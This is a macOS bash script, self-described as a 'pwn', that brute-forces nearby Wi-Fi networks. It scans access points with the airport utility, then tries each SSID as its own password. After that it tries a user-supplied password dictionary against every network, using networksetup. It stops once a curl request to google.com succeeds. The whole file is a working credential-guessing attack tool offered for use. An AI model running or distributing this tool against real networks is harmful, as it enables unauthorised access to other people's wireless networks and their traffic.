#!/bin/bash

# Meat of the pwn
connect () {
	ssid="$1"
	password="$2"
	echo `date "+[%H:%M:%S]"` $ssid / $password
	
	# Launch networksetup and stop immediately after the first line. No point in multiple retries.
	script -q /dev/null networksetup -setairportnetwork en0 "$ssid" "$password" | {
		read line;
		printf "\r--- $line\r\n";
		killall script
	}

	# Sometimes APs can be joined but you get no connectivity, or you get a captive portal. Google helps with false positives.
	printf "\r"
	if curl google.com; then exit; fi
	printf "\r\n\n"
}


# Scan for visible APs
rm network-list
echo "Scanning for networks"
(
	printf "				Please remove the lines of the networks you don't want to check\n"
	printf "				      You'll get to check your passwords in the next screen\n\n"
	/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport scan
) >> network-list

# Give the user a chance to tweak stuff
nano network-list
nano password-list

# Extract the SSIDs
cat network-list | grep : | perl -pe 's/^ *([^:]*) ..:.*$/\1/g' | sort -u > network-list

# Start the pwn
rm -f log

# Do an SSID/SSID pass jsut in case because that's pretty common. Only works for SSID longer than 8 chars, though.
echo "Doing a quick SSID/SSID pass"
while read -u 9 ssid; do
	if [[ ${#ssid} -ge 8 ]]; then
		connect "$ssid" "$ssid" | tee -a log
	fi
done 9< network-list

# Look up the dictionary (sorted by probability, hopefully), trying every AP before moving on to the next password
echo "Doing the dictionary pass"
while read -u 8 password; do
	while read -u 9 ssid; do
		connect "$ssid" "$password" | tee -a log
	done 9< network-list
done 8< password-list
